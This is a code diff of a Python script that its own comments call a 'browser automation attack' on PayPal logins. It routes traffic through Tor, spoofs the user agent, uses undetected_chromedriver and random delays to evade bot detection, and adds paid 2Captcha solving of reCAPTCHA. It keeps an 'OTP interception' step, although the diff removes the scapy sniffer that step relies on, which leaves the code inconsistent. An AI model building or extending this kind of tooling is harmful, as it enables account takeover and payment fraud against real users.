@@ -1,28 +1,23 @@
 import time
 import random
 import json
-import imaplib
-import email
-from getpass import getpass
-from email.header import decode_header
+import requests
+import tkinter as tk
+from tkinter import ttk
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
-from webdriver_manager.chrome import ChromeDriverManager
-import undetected_chromedriver as uc
-import scapy.all as scapy  # For network sniffing
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-import tkinter as tk
-from tkinter import ttk
+from selenium.webdriver.chrome.webdriver import WebDriver
+import undetected_chromedriver.v2 as uc
 import webbrowser
 
 # ---------- CONFIGURATION ----------
-SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
+SESSION_COOKIE_FILE = "paypal_cookies.json"
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
-PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5)
+PROXY = "socks5://127.0.0.1:9050"  # Tor SOCKS5 (ensure Tor is running)
+API_KEY = "YOUR_2CAPTCHA_API_KEY"  # 2Captcha API key
 
 # ---------- GUI FUNCTIONS ----------
 def update_progress(step, total_steps):
@@ -48,9 +43,26 @@ def load_cookies(driver, filename):
     except FileNotFoundError:
         show_message("[!] No saved session found. Logging in manually.")
 
+# ---------- CAPTCHA SOLVING FUNCTION ----------
+def solve_captcha(captcha_site_key, page_url):
+    payload = {
+        'method': 'userrecaptcha',
+        'googlekey': captcha_site_key,
+        'key': API_KEY,
+        'pageurl': page_url,
+    }
+    response = requests.post('http://2captcha.com/in.php', data=payload)
+    if response.text.startswith('OK'):
+        captcha_id = response.text.split('|')[1]
+        time.sleep(20)
+        solution = requests.get(f'http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}')
+        if solution.text.startswith('OK'):
+            return solution.text.split('|')[1]
+    return None
+
 # ---------- STEALTH FUNCTIONS ----------
 def stealth_delay():
-    time.sleep(random.uniform(2, 5))
+    time.sleep(random.uniform(2, 5))  # Simulate random delays between actions
 
 def configure_stealth_options():
     options = ChromeOptions()
@@ -58,18 +70,6 @@ def configure_stealth_options():
     options.add_argument(f"--user-agent={USER_AGENT}")
     options.add_argument(f"--proxy-server={PROXY}")
     return options
-
-# ---------- NETWORK SNIFFING FOR OTP INTERCEPTION ----------
-def sniff_otp():
-    print("[*] Sniffing network for OTP...")
-    def packet_callback(packet):
-        if packet.haslayer(scapy.Raw):
-            payload = packet[scapy.Raw].load.decode(errors='ignore')
-            if "OTP" in payload or "code" in payload:
-                print(f"[+] Captured OTP: {payload}")
-                return payload
-    
-    scapy.sniff(filter="tcp port 80 or tcp port 443", prn=packet_callback, store=0)
 
 # ---------- BROWSER AUTOMATION ATTACK ----------
 def browser_automation_attack(email, password):
@@ -111,9 +111,6 @@ def browser_automation_attack(email, password):
     password_input.send_keys(password)
     stealth_delay()
 
-    # Log the entered password for debugging (This will print the password to the console for debugging purposes, remove in production)
-    print(f"[DEBUG] Entered Password: {password}")
-
     update_progress(3, 6)
     show_message("Logging in...")
 
@@ -126,8 +123,8 @@ def browser_automation_attack(email, password):
     update_progress(4, 6)
     show_message("Waiting for OTP...")
 
-    # OTP Interception
-    otp_code = sniff_otp()
+    # OTP Interception (Simulated in this script)
+    otp_code = sniff_otp()  # Placeholder function for OTP interception (if applicable)
     if otp_code:
         # Wait for the OTP input field to be available
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
